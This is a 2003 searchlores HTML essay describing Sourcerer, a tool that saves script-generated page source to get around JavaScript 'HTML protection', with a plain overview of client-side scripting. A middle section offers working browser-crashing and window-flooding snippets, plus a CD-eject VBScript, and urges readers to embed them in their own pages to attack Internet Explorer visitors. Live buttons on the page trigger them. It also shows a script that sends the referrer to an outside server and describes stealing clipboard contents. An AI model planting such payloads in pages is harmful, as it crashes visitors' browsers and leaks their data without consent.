@@ -1,0 +1,255 @@
+<html><head><title>source_3.htm Sourcerer:  The eight son of the eight son</title></head>
+<BODY bgcolor="#CCCCCC" TEXT=#001010 LINK="#0000FF" ALINK="#00FF00" VLINK="#3366CC">
+<table border=1 align=center width=90%><tr>
+<td><a href="tools.htm"><img width=256 height=256 src="images/sourcerer.jpg" alt="An html 
+protecion 'Wizzard' after having taken his dried frog pills :)"></a></td>
+<td ><center><font size="+3">~ Sourcerer ~ <br> Javascript 
+protections busting</font><br><font size=-1>v 0.1 May 2003 by Mordred</font></center>
+<br>
+<ul>
+<li> <a href="source_3.htm#overview">Overview</a> of the <a href="zipped/sourcerer.zip">program</a> [~30K]
+<li> OT: <i><a href="source_3.htm#annoy_ie">Annoy IE users whe(n|r)ever possible</a></i>
+<li> <a href="source_3.htm#js_tech">Technical overview of the HTML scripting languages</a>&nbsp;&nbsp;(a la <a href="http://msgs.securepoint.com/cgi/AT-sp-search?sp=sp&db=bugtraq&search=hotmail+javascript"><b>javasCript</b></a>)
+<li> <a href="source_3.htm#code_snip">Essential VB code snippet</a>
+</ul>
+</td>
+</table>
+
+<br><br><br><br>
+<font face="Verdana, Arial, Sans-serif" size="3">
+<i>This file is a part of the sourcerer package. To find the original essays and packages 
+@ searchlores, use
+<a href="http://www.searchlores.org/cgi-bin/search?query=sourcerer&submit=Search%21&max=20&result=normal&sort=score">namazu</a>.
+</i>
+<a name=overview>
+<h3>Overview</h3>
+<p>The <b>Sourcerer</b> alows you to save the source of those annoying web sites that
+use JavaScript to generate content. Ordinary browsers can save only the <i>source</i>
+of the source, for example let's suppose you have a page which says:
+</p>
+<pre>
+&lt;SCRIPT language=javascript&gt;&lt;!--
+document.write("Hello world");//--&gt;
+&lt;/SCRIPT&gt;
+</pre>
+<p>
+In your browser you will see only the text "Hello world", but if you save the page's 
+source, you will see only this piece of script. Because of this, some 
+<a target=_blank href="http://www.htmlcrypto.com/index3.html">really bad people</a>
+(you may think it's just funny, but, well, it's not) decided they can 
+make money on the backs of the others, selling them stupid
+"HTML protection" software, which is more or less a javascript which decodes the
+actual source on the fly.
+</p>
+<p>
+Here's what we do. Go to <a target=_blank href="http://www.blmodirect.com/letters/b5012protected.htm">
+http://www.blmodirect.com/letters/b5012protected.htm</a> (or try the local copy provided in the package
+ if that one is down). Rightclick on the browser window,
+and choose "View source". Mm, yeah ... tons of crap. Now open the same URL in Sourcerer (copy & paste
+the URL - that's the only way which is anyway the fastest, so get used to it). Choose Save source and
+open the result in your text editor. That's about how you use <b>Sourcerer</b>. If you're playing at 
+<a href="http://3564020356.org/">+Mala's</a>, don't forget to try it on the third riddle :)
+</p>
+<p>
+If you have a large collection of files to convert (you downloaded them with wGet of course, 
+certainly NOT by hand), you can automate their conversion using the commandline:<br>
+<pre>
+Sourcerer.exe "file://localhost/c:/dir with spaces/index.html" c:\no_spaces_therefore_no_quotes\1.html
+Sourcerer.exe http://www.searchlores.org index.htm
+</pre>
+</p>
+<p>
+<a name=annoy_ie>
+<b>IMPORTANT!</b> Please, use your brain. <b>Sourcerer</b> uses an IE WebBrowser control, which means
+that it is effectively an IE copy. Don't use it for browsing, or you'll get hacked, spammed, flooded 
+or made to look stupid in any other way. Proof? <font size=-1><i>(Btw, do copy these snippets in your html pages to annoy
+the bozos that use IE, or better, find 
+<a href="http://www.altavista.com/web/results?pg=aq&avkw=xytx&filetype=&aqmode=b&aqb=%28ie+OR+%22internet+explo%2Aer%22%29+NEAR+%28crash%2A+OR+flaw%2A+OR+vulnerab%2A+OR+exploit%2A+OR+advisory+OR+advisories+OR+%22security+hole%22%29+AND+2003&aqs=&kgs=0&kls=0&stq=60">
+fresh</a>
+<a href="http://www.microsoft.com/technet/treeview/default.asp?url=/technet/security/current.asp">
+ones</a>
+,or 
+<a href="http://b0iler.eyeonsecurity.org/tutorials/javascript.htm">
+learn</a>
+to write such scripts on your own.)</i></font>
+<br><br><table border=1 width=90% align=center>
+<tr><td>
+	<pre>&lt;input type crash&gt;</pre>
+	<i>Crashes IE, <a href="http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&q=%22input+type+crash%22+advisory&btnG=Google+Search">details</a></i>
+</td><td>
+	<input type=button value="Crash!" onclick="document.write('<input type crash>')">
+</td></tr>
+<tr><td>
+	<pre>&lt;object ID=crash CLASSID='CLSID:00022613-0000-0000-C000-000000000046'&gt; &lt;/object&gt;</pre>
+	<i>Crashes IE, <a href="http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&q=00022613+vulnerability&btnG=Google+Search">details</a></i>
+</td><td>
+	<input type=button value="Boom!" onclick="document.write('<object ID=crash CLASSID=\'CLSID:00022613-0000-0000-C000-000000000046\'> </object>')">
+</td></tr>
+<tr><td>
+	<pre>&lt;script&gt;while(1)w=window.open('','')&lt;/script&gt;</pre>
+	<i>Opens windows in a loop, not a major pain in the ass as there is a limit to the number of windows, 
+	and the IEXPLORE task can be easily killed</i>
+</td><td>
+	<input type=button value="Faint!" onclick="while(1)w=window.open('','')">
+</td></tr>
+<tr><td>
+	<pre>&lt;script&gt;while(1) {
+	alert('1');
+	document.write("&lt;script&gt;while(1)w=window.open('','')&lt;/sc"+"ript&gt")}
+&lt;/script&gt;</pre>
+	<i>Improved example: not so easily killed</i>
+</td><td>
+	<input type=button value="Swoon!" onclick="document.write('<script>while(1){alert(1);document.write(\'<script>while(1)w=window.open(\\\'\\\',\\\'\\\')</sc\'+\'ript>\')}</script>')">
+</td></tr>
+<tr><td>
+	<pre>&lt;SCRIPT LANGUAGE="VBScript">&lt;!--
+Set oWMP = CreateObject("WMPlayer.OCX.7" )
+Set colCDROMs = oWMP.cdromCollection
+if colCDROMs.Count >= 1 then
+        For i = 0 to colCDROMs.Count - 1
+                colCDROMs.Item(i).Eject
+        Next 
+End If
+-->&lt;/SCRIPT></pre>
+	<i>And one for comic relief - eject your cd tray</i>
+</td><td>
+<script>
+function eject() {
+	document.write('<SCRIPT LANGUAGE="VBScript">');
+	document.write('Set oWMP = CreateObject("WMPlayer.OCX.7" )\n');
+	document.write('Set colCDROMs = oWMP.cdromCollection\n');
+	document.write('if colCDROMs.Count >= 1 then\n');
+	document.write('        For i = 0 to colCDROMs.Count - 1\n');
+	document.write('                colCDROMs.Item(i).Eject\n');
+	document.write('        Next \n');
+	document.write('End If\n');
+	document.write('</SCR'+'IPT>');
+}
+</script>
+	<input type=button value="Eject!" onclick="eject();">
+</td></tr>
+
+</table>
+<br>
+Note that these snippets will work without any user interaction whatsoever, the examples here requre a button push so you can read the article, duh :)
+Also, I haven't tested them under many OS/browser combinations, on your system these may behave differently.
+</p>
+<p>
+<a name=js_tech>
+<h3>Scripting overview</h3>
+<a href="http://b0iler.eyeonsecurity.org/tutorials/javascript.htm">There</a> are more 
+thorough papers on the subject for the interested reader, so this section will be 
+targeted to non-coding seekers, therefore will be kept as low-tech as possible. 
+<br><br>
+The most important thing to know is that HTML scripting is something that happens on
+YOUR side of the user-internet duet (as opposed to CGI or server-side scripting, which
+happens on a server). It is also called client-side scripting. The scripts are programs,
+which are interpreted (i.e. translated into machine-understandable code) and run by your 
+browser.
+<br><br>
+These little programs can do a lot of things (which some people may consider useful), 
+but are mainly designed to change or add the content of the HTML document
+like for example printing the current time and date. This means that the page source,
+which your browser downloads from the remote server, will be one and the same, but still
+you will see different text each time. Browse to 
+<a href="http://www.searchlores.org">www.searchlores.org</a> with and without JavaScript
+and see the difference.
+<pre>
+1)&lt;SCRIPT LANGUAGE="JavaScript">
+2)	document.write("&lt;I>Updated &lt;/I>");
+3)	document.write("&lt;font color=black>");
+4)	document.write(UpdateDate(5,7,2003)); 
+5)	document.write("&lt;/font>&lt;/i>");
+6)&lt;/script></pre>
+Let's follow what it does:<br>
+The 1) and 6) tags denote a piece of HTML which is a script. If the browser does not support or
+accept scripting, the contents will be ignored. The "language" attribute
+tells us (and more importantly - tells the browser) that this is JavaScript. The 2) 3) and 5)
+lines print some text to the HTML document, which is the same as if the text was directly 
+included in the HTML, while 4) does something more interesting - it calls a function 
+(a subroutine; a small piece of code, defined elsewhere to do routine job) - which prints
+the number of days since the date, specified by the three numbers (month, day, year).
+<br><br>
+Note that since the user agents ('browsers') of the current search engines do not intepret
+scripts, any text written by such means will be visible only to the human reader. For example,
+compare <a href="http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=utf-8&q=site%3Asearchlores.org+searching&btnG=Google+Search">
+site:searchlores.org searching</a> with
+<a href="http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=utf-8&q=site%3Asearchlores.org+updated&btnG=Google+Search">
+site:searchlores.org updated</a>
+<br><br>
+Each scripting language (JavaScript, VBScript, JScript) has it's own syntactical rules, which
+are not subject to this article, and you should normally not worry about them. We can also 
+consider Java and Flash Action Script as such scripting languages (although they are 
+precompiled instead of being interpreted on the fly, but this difference is of no importance 
+here), because they are too executed on the client side. All these languages were designed
+to be 'secure' in the means that they cannot (rather SHOULD not) read or write files from the
+user's machine, execute local commands, etc. The sad thing is that exploits are continuously 
+found, which explore bugs in the scripting system, alowing anything from slight annoyances 
+(like opening all your CD trays at once) to serious security breaches (full read/write/execute 
+access to the victim's machine). That's why common sense dictates that we browse with scripting
+turned off (no matter what browser we use).
+<br><br>
+Besides exploits, which are unnormal behaviour of the scripting system, it's normal behaviour
+has some uncanny features too. Being integrated with your browser, JavaScript for example knows
+WHAT kind of browser it is, what is your OS, your screen resolution, color-depth, browser history
+and even the contents of your 
+<a href="http://www.google.com/search?q=%22internet+explorer%22+advisory+%22clipboard+contents%22&sourceid=opera&num=0&ie=utf-8&oe=utf-8">
+clipboard</a>! You may think that this is okay, since it's executed only on your machine,
+but it's not, since you can do something like this:
+<pre>
+&lt;script language=javascript>
+	document.write("&lt;img src='http://myserver.com/my_fake_image_script.gif?" + document.refferer + "'>");
+&lt;/script>
+</pre>
+This means that we include in the page's source an image tag, and the image source we provide
+is in fact a masquaraded SERVER-SIDE script, which, when your
+browser blindly goes to download that image, will receive the reffering URL. Or the screen
+width. Or the clipboard. Or you can make the page periodically check (while it is active) if 
+there's something new in the clipboard and send it to your server. 
+Do you copy and paste your passwords?
+<br><br>
+Btw Opera users are not much more immune to these tricks, as even with images loading turned 
+off, some images can be loaded through css or javascript. The paranoid to the 
+bone should use wGet with the <b>--page-requisites</b> option, with faked refferer and user-agent 
+fields through a secure proxy to download the page they want to view. Then disconnect from 
+the internet, manually check each file for suspicious code (did you know that in the past 
+Netscape Navigator would execute javascript 
+<a href="http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=utf-8&q=%22netscape+navigator%22+javascript+image+exploit+OR+vulnerability&btnG=Google+Search">
+hidden</a> in GIF comments?), render the page through Sourcerer, manually cut remaining 
+scripts, and then hope that his browser would not be crashed by the latest strange
+<a href="http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&q=%22input+type+crash%22+advisory&btnG=Google+Search">exploit</a>.
+It's not an easy life, being paranoid :) Yeah, well, just turn off JavaScript, okay?
+</p>
+<p>
+<h3>Finale</h3>
+<a name="code_snip">
+The sources are included in the <a href="zipped/sourcerer.zip">package</a>, do whatever you want with them, I don't care.
+To save the curious their precious time, the essence of this program is this snippet:
+<pre>
+		Dim doc As HTMLDocument
+		Set doc = Browser.Document
+		...
+		s = doc.documentElement.outerHTML
+</pre>
+</p>
+</font> <br> <hr>
+    <center> 
+    <a href= "tools.htm"><IMG  SRC= "images/basipet.jpg" 
+  ALT= "Petit image"
+  ALIGN= BOTTOM WIDTH= "118" HEIGHT= "68" BORDER= 0 VSPACE= 0
+  HSPACE= 0></a>
+  <br><A HREF="http://www.baidu.com/gaoji/advanced.html" target="_blank">B</a><A HREF="http://www.kartoo.com/" target="_blank">k</a>:<A HREF="http://www.alltheweb.com/advanced" target="_blank">f</a><A HREF="http://search.lycos.com/adv.asp" target="_blank">l</A><a href="http://www.altavista.com/web/text?" target="_blank">a</a><a href=http://groups.google.com/advanced_group_search target="_blank">n</a><a href="http://www.google.com/advanced_search" target="_blank">g</a><A HREF="http://www.infospace.com/info.xcite/" target="_blank">e</a><a href="http://web.archive.org/collections/web/advanced.html" target="_blank">&nbsp;</a><a href="http://fravia.2113.ch/phplab/scroll.htm" target="_blank">o</a><A HREF="ftp.htm" target="_blank">f</a><A HREF="http://www.wisenut.com/" target="_blank">&nbsp;</a><A HREF="http://search.msn.com/advanced.asp" target="_blank">m</a><A HREF="http://search.yahoo.com/web/advanced" target="_blank">y</a><A HREF="http://s.teoma.com/AdvancedSearch?q=" target="_blank">t</a><A HREF="http://www.hotbot.com/adv.asp?prov=Inktomi&tab=web" target="_blank">h</a><a href="http://a9.com/-/search/advSearch">&nbsp;</a>
+
+    <br>
+    <!-- how to search the web, by fravia+, signet begin --> 
+    <table><tR><td width= "300" height= "2"  bgcolor= "#993300"></tD></tR></table>
+  (c) 1952-2032: <font color= blue><font color= blue>[</fonT></font><a
+  href= "info.htm">fravia+</a><font  color= blue><font color= blue>]</fonT></font>, all rights
+  reserved
+  <!-- how to search the web, by fravia+, signet end -->
+  
+  
+  <!-- begin da closing bit, duh -->
+  </CENTER>
+  </body>
+  </HTML>
